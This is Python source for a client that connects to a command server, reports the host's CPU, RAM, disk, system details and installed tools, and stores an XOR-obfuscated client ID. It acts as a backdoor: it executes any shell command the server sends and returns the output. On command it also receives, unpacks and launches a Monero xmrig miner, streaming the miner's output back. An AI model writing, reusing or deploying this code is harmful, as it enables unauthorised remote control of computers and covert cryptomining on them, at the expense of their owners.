import socket
import os
import uuid
import system_info
import json
import subprocess
import sys
import io
import asyncio
import threading
import queue

if sys.version_info >= (3, 6):
    import zipfile
else:
    import zipfile36 as zipfile

xorKey = b"Kio890"



def is_valid_zip(data):
    try:
        with zipfile.ZipFile(io.BytesIO(data)) as zip_ref:
            return zip_ref.testzip() is None
    except Exception as e:
        return False
    
def xor_encrypt_decrypt(data):
    data = bytearray(data)
    for i in range(len(data)):
        data[i] ^= xorKey[i % len(xorKey)]
    return data
# Function to read and send process output
def read_output(process, output_queue):
    for line in iter(process.stdout.readline, ''):
        output_queue.put(line.strip())

# Asynchronous function to send output to the server
async def send_output(output_queue, websocket):
    while True:
        output_line = output_queue.get()
        await websocket.send(output_line)

async def main():
    installed_tools_list = system_info.installed_tools()
    while True:

        try:
            ip = socket.gethostbyname(socket.gethostname())

            # Initialize Winsock
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((ip, 27015))

            print("Connected to server.")

            client_identifier_file = "client-id.txt"

            if os.access(client_identifier_file, os.R_OK):
                with open(client_identifier_file, "rb") as file:
                    buffer_identifier_file = bytearray(file.read())
                buffer_identifier_file = xor_encrypt_decrypt(buffer_identifier_file)
                client_identifier = buffer_identifier_file.decode("utf-8", errors="ignore")
          
                
                data_json = json.dumps({                    
                    "id": client_identifier,
                    "cpu": system_info.get_cpu_info(),
                    "gpu": system_info.get_cpu_info(),
                    "ram": system_info.get_ram_info(),
                    "disk": system_info.get_hard_drive_info(),
                    "system": system_info.get_system_info(),
                    "installed_tools": installed_tools_list
                }).encode()

                

                client_socket.send(data_json)
            else:
                client_uuid = str(uuid.uuid1())
                print(client_uuid)
                client_socket.send(client_uuid.encode())
                client_identifier = xor_encrypt_decrypt(client_uuid.encode())
                with open(client_identifier_file, "wb") as file:
                    file.write(client_identifier)

            startInstalling = False
            accumulated_data = b""
            delimiter = "END_MONERO;s#1&".encode()


            while True:
                recv_buf = client_socket.recv(1024)
                if recv_buf:
           
                    # print("Buffer received:", recv_buf)

                    if startInstalling:

                        app_path = "monero.zip"  # Change this to the desired path

                        # if recv_buf == "END_MONERO;":
                        if delimiter in recv_buf:
                            # Separate the data at the delimiter
                            parts = recv_buf.split(delimiter, 1)
                            app_data = parts[0]

                            accumulated_data += app_data

                            if (is_valid_zip(accumulated_data)):

                                # print(f"++++{app_data}")
                                with open(app_path, "wb") as app_file:
                                    app_file.write(accumulated_data)

                                try:
                                    # Unzip the received file
                                    with zipfile.ZipFile(app_path, 'r') as zip_ref:
                                        zip_ref.extractall(".")  # Specify your installation directory
                                    installation_output = "Monero installation successful."
                                except Exception as e:
                                    installation_output = f"Error during installation: {str(e)}"
                            else:
                                installation_output = "Error during installation: File is not a valid ZIP file." 
        

                            startInstalling = False
                            print(installation_output)
                            modified_output = "s#0&\n" + installation_output + "s#1&\n"
                            
                            client_socket.send(modified_output.encode())
                        
                          
                        else:
                            accumulated_data += recv_buf
                            # print(f"{os.getcwd()}\\{app_path}")
                        # try:
                        #     # Perform the installation process here
                        #     installation_result = subprocess.run(f"tar -xf {os.getcwd()}\\{app_path}" , capture_output=True, text=True)
                        #     installation_output = installation_result.stdout + installation_result.stderr
                        # except Exception as e:
                        #     installation_output = str(e)
                      
                  
                    elif recv_buf.decode().startswith("stream::"):
                        recv_buf = recv_buf.decode()[len("stream::"):]
                        if (recv_buf.startswith("monero/xmrig.exe")):            
                            # Execute the command and capture its output in a log file
                            log_file_path = "xmrig_output.log"

                            # Execute the command and capture its output
                            process = subprocess.Popen(
                                recv_buf,
                                shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                text=True,
                                bufsize=1,  # Line-buffered
                                universal_newlines=True,
                            )

                            # Use a queue to store output lines
                            output_queue = queue.Queue()

                            # Start a thread to read output
                            output_thread = threading.Thread(target=read_output, args=(process, output_queue))
                            output_thread.daemon = True
                            output_thread.start()

                            # Asynchronously send output to the server
                            await asyncio.gather(
                                send_output(output_queue, client_socket),
                                process.wait()  # Wait for the process to complete
                            )
                            print("Command execution complete")
                        else:
                            print(recv_buf)
                            # Create a subprocess and open a stream
                            process = subprocess.Popen(
                                recv_buf,
                                shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                text=True,
                                bufsize=1,  # Line-buffered
                                universal_newlines=True,
                            )

                            # Continuously read and process the output
                            for line in process.stdout:
                                print(line)
                                client_socket.send(f"{line}s#1&".encode())

                            print("start Excuting")
                            # Wait for the process to complete
                            process.wait()
                            client_socket.send("sTop#0&".encode())
                            print("End Excuting")

                    else:
                        recv_buf = recv_buf.decode()

                        if recv_buf == "INSTALL_MONERO:":
                            startInstalling = True
                        elif recv_buf == "END_MONERO;s#1&":
                            startInstalling = False

                        else:
                            try:
                                command_output = os.popen(recv_buf).read()
                                    
                             
                            except Exception as e:
                                command_output = str(e)

                            modified_output = "s#0&\n" + command_output + "s#1&\n"
                            client_socket.send(modified_output.encode())
                else:
                    break

        except Exception as e:
            print("Error:", e)
            client_socket.close()
            continue

if __name__ == "__main__":
    asyncio.get_event_loop().run_until_complete(main())
